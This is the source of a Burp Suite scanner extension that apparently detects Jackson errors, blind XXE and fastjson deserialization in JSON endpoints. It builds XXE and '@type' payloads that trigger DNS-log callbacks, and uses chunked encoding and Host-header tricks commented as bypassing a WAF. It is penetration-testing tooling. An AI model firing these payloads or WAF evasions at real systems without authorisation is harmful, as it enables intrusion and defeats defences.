from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from array import array
from java.io import PrintWriter
from burp import IRequestInfo

import re, json, uuid

from commburp import  CustomScanIssue, isblackext, get_random_string, changeReqHttpVersion, get_random_domain, checkresults, get_random_dns_domain
from utilfuncs import fetchdnslogresults, getrpcresult
from rpcconfig import WildFlag

SSRFDOMAIN = "your.dnslog.domain" ## change to your dns domain
RandomPayloadLen = 5
ctpat = re.compile(r'Content-Length:\s*\d+',re.I)
contypepat = re.compile(r'Content-Type:\s*[\S]*',re.I) 
hostpat = re.compile(r'Host:\s*[\S]*',re.I) 
# bug \r\n


class BurpExtender(IBurpExtender, IScannerCheck):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("json se scanner")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        self.ssrfpayload = SSRFDOMAIN

        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)


    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def _get_matches(self, response, match):
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen

        return matches



    def buildReqReplaceBody(self,Req, rawbody, contype):
        OldReq = Req
        OrigLen = len(OldReq)
        
        firstlineindex = OldReq.index("\r\n")

        NewReq = OldReq[:firstlineindex] + OldReq[firstlineindex:]

        #headers,body = NewReq.split("\r\n\r\n")
        postindex = NewReq.index("\r\n\r\n")
        headers = NewReq[0:postindex]
        #body = NewReq[postindex:]
        body = "\r\n\r\n"+rawbody
        #print(body)
        if len(body) > 4:
            NewReq = "".join((headers,body))
            newbodyindex = NewReq.index("\r\n\r\n")
            newbody = NewReq[newbodyindex+4:]
            #newheaders,newbody = NewReq.split("\r\n\r\n")
            NewReq = re.sub(ctpat,"Content-Length: "+str(len(newbody)),NewReq)
            NewReq = re.sub(contypepat,"Content-Type: %s" % contype,NewReq)
            NewReq = re.sub(hostpat,lambda m:m.group(0)+".",NewReq)  # bypass tx waf 

        if(len(NewReq) == OrigLen):
            return None
        else:
            return NewReq

    def buildReqReplaceBodyChunked(self,Req, rawbody, contype, keyword):
        OldReq = Req
        OrigLen = len(OldReq)
        
        firstlineindex = OldReq.index("\r\n")

        NewReq = OldReq[:firstlineindex] + OldReq[firstlineindex:]
        #NewReq = OldReq[:firstlineindex].replace("HTTP/2","HTTP/1.1") + OldReq[firstlineindex:]

        #headers,body = NewReq.split("\r\n\r\n")
        postindex = NewReq.index("\r\n\r\n")
        headers = NewReq[0:postindex]

        bodysplits = rawbody.split(keyword, 1)
        newrawbody = ""
        newrawbody += hex(len(bodysplits[0]+keyword[0]))[2:]+'\r\n'+  bodysplits[0]+keyword[0] + '\r\n'
        newrawbody += hex(len(keyword[1:]+bodysplits[1]))[2:]+'\r\n'+  keyword[1:]+bodysplits[1] + '\r\n'
        newrawbody += "0\r\n\r\n"

        #body = NewReq[postindex:]
        body = "\r\n\r\n"+newrawbody
        #print(body)
        if len(body) > 4:
            NewReq = "".join((headers,body))
            newbodyindex = NewReq.index("\r\n\r\n")
            newbody = NewReq[newbodyindex+4:]
            #newheaders,newbody = NewReq.split("\r\n\r\n")
            NewReq = re.sub(ctpat,"Transfer-Encoding: chunked",NewReq)
            NewReq = re.sub(contypepat,"Content-Type: %s" % contype,NewReq)
            NewReq = re.sub(hostpat,lambda m:m.group(0)+".",NewReq)  # bypass tx waf 

        if(len(NewReq) == OrigLen):
            return None
        else:
            return NewReq

    def getjsonpayload(self,paravalue):
        jsonbody = json.loads(paravalue)
        randomkey = "js"+get_random_string(RandomPayloadLen)
        randomvalue = "on"+get_random_string(RandomPayloadLen)
        if isinstance(jsonbody, dict):
            jsonbody[randomkey] = randomvalue
        if isinstance(jsonbody, list):
            jsonbody.append({randomkey: randomvalue})
        return json.dumps(jsonbody)




    def doPassiveScan(self, baseRequestResponse):
        # look for matches of our passive check grep string
        #matches = self._get_matches(baseRequestResponse.getResponse(), GREP_STRING_BYTES)

        self.randomstr = get_random_domain(RandomPayloadLen)

        arbrr = self._helpers.analyzeRequest(baseRequestResponse)


        url = self._helpers.analyzeRequest(baseRequestResponse).getUrl()
        
        urlpath = url.getPath()
        blackextlist = [".js",".css",".font",".jpg",".png",".webp",".gif",".svg",".ico",".jpeg",".woff"]
        if isblackext(urlpath, blackextlist):
            return None


        randomssrfpayload = self.randomstr + '.'+self.ssrfpayload

        reqct = arbrr.getContentType()
        issueresult = []
        blindissueresult = []
        if reqct == IRequestInfo.CONTENT_TYPE_JSON:
            #self.stdout.println("content type match" + url )
            body = self._helpers.bytesToString(baseRequestResponse.getRequest()[arbrr.getBodyOffset():])
            jsonbody = self.getjsonpayload(body)
            # jsonbody = json.loads(body)
            # randomkey = get_random_string(RandomPayloadLen)
            # randomvalue = get_random_string(RandomPayloadLen)
            # if isinstance(jsonbody, dict):
            #     jsonbody[randomkey] = randomvalue
            # if isinstance(jsonbody, list):
            #     jsonbody.append({randomkey: randomvalue})

            OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
            NewReq = self.buildReqReplaceBody(OldReq, jsonbody, "application/json")
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
            modrespstr = self._helpers.bytesToString(checkRequestResponse.getResponse()).split("\r\n\r\n",1)

            if len(modrespstr)>1 and "fasterxml" in modrespstr[1]:
                self.stdout.println(url)
                self.stdout.println("[---jackson---]: payload [ body ]")
                issueresult.append(CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                        "JACKSON",
                        "json payload [ body ] response contains [ fasterxml ] " ,
                        "High","Tentative", self._helpers.bytesToString(baseRequestResponse.getRequest())))

            randdns = get_random_dns_domain()
            xxepayload = '<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY f SYSTEM "ftp://'+ randdns +'">]><x>&f;</x>' 
            NewReq = self.buildReqReplaceBody(OldReq, xxepayload, "application/xml")
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
            body = {"jsonrpc": "2.0","method": "insertscanreq","params": {"dns": randdns, "requrl": url.toString(), "reqcontent": NewReq, "scantype": "XXE"},"id": str(uuid.uuid1())}
            getrpcresult(body)
            issresult = checkresults(self._callbacks.addScanIssue)
            # if issresult:
            #     blindissueresult.extend(issresult)

            randdns = get_random_dns_domain()
            fastjsonpayload = '{"@type":"java.net.Inet4Address", "val":"'+ randdns +'"}'
            NewReq = self.buildReqReplaceBody(OldReq, fastjsonpayload, "application/json")
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
            body = {"jsonrpc": "2.0","method": "insertscanreq","params": {"dns":randdns, "requrl": url.toString(), "reqcontent": NewReq, "scantype": "fastjson"},"id": str(uuid.uuid1())}
            getrpcresult(body)
            issresult = checkresults(self._callbacks.addScanIssue)
            # if issresult:
            #     blindissueresult.extend(issresult)

            modrespstr = self._helpers.bytesToString(checkRequestResponse.getResponse()).split("\r\n\r\n",1)

            randdns = get_random_dns_domain()
            fastjsonpayload = '{"@type":"java.net.Inet4Address", "val":"' + randdns + '"}'
            NewReq = self.buildReqReplaceBodyChunked(OldReq, fastjsonpayload, "application/json","@type")
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq), True)
            body = {"jsonrpc": "2.0","method": "insertscanreq","params": {"dns":randdns, "requrl": url.toString(), "reqcontent": NewReq, "scantype": "fastjsonchunked"},"id": str(uuid.uuid1())}
            getrpcresult(body)
            issresult = checkresults(self._callbacks.addScanIssue)
            # if issresult:
            #     blindissueresult.extend(issresult)


        rsp = self._helpers.analyzeResponse(baseRequestResponse.getResponse())
        contype = rsp.getStatedMimeType()
        statuscode = rsp.getStatusCode()

        if int(statuscode) == 404:
            return None

        # json params
        paralist = arbrr.getParameters()
        jsonparas = []
        orirespstr = self._helpers.bytesToString(baseRequestResponse.getResponse())

        for pa in paralist:
            #self.stdout.println("" + pa.getName() + ","+pa.getValue())
            v = self._helpers.urlDecode(pa.getValue())
            #self.stdout.println(v)
            try:
                if (v[0] == "{" or v[0] == "[") and (v[-1] == "}" or v[-1] == "]"):
                    json.loads(v)
                    jsonparas.append(pa)

            except Exception as e:
                pass


        vulnparas = []
        #xsspayload="a'\"><j"+get_random_string(2)+">_<8"+get_random_string(3)
        for k in jsonparas:
            #self.stdout.println("" + k.getName())
            jsonpayload = self.getjsonpayload(self._helpers.urlDecode(k.getValue()))
            
            newReq = self._helpers.updateParameter(baseRequestResponse.getRequest(),self._helpers.buildParameter(k.getName(),self._helpers.urlEncode(jsonpayload),k.getType()))
            newReq = self._helpers.stringToBytes(changeReqHttpVersion(self._helpers.bytesToString(newReq)))
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newReq)
            modrespstr = self._helpers.bytesToString(checkRequestResponse.getResponse()).split("\r\n\r\n",1)
            if len(modrespstr) == 1:
                continue
            if "fasterxml" in modrespstr[1]:
                self.stdout.println(url)
                self.stdout.println("[---jackson---]: " + k.getName())
                vulnparas.append(k.getName())

            randdns = get_random_dns_domain()
            fastjsonpayload = '{"@type":"java.net.Inet4Address","val":"'+randdns+'"}'
            newReq = self._helpers.updateParameter(baseRequestResponse.getRequest(),self._helpers.buildParameter(k.getName(),self._helpers.urlEncode(fastjsonpayload),k.getType()))
            newReq = self._helpers.stringToBytes(changeReqHttpVersion(self._helpers.bytesToString(newReq)))
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newReq)
            body = {"jsonrpc": "2.0","method": "insertscanreq","params": {"dns": randdns, "requrl": url.toString(), "reqcontent": self._helpers.bytesToString(newReq), "scantype": "fastjson"},"id": str(uuid.uuid1())}
            getrpcresult(body)
            issresult = checkresults(self._callbacks.addScanIssue)
            # if issresult:
            #     blindissueresult.extend(issresult)
                
        if vulnparas:
            issueresult.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                    "JACKSON",
                    "para name [ %s ] xss payload [ fasterxml ] " % (",".join(vulnparas),),
                    "High","Tentative", self._helpers.bytesToString(baseRequestResponse.getRequest()) ))
        
        issueresult.extend(blindissueresult)

        if issueresult:
            return issueresult


#        return None



    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # make a request containing our injection test in the insertion point

        # report the issue
        return None

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1

        return 0

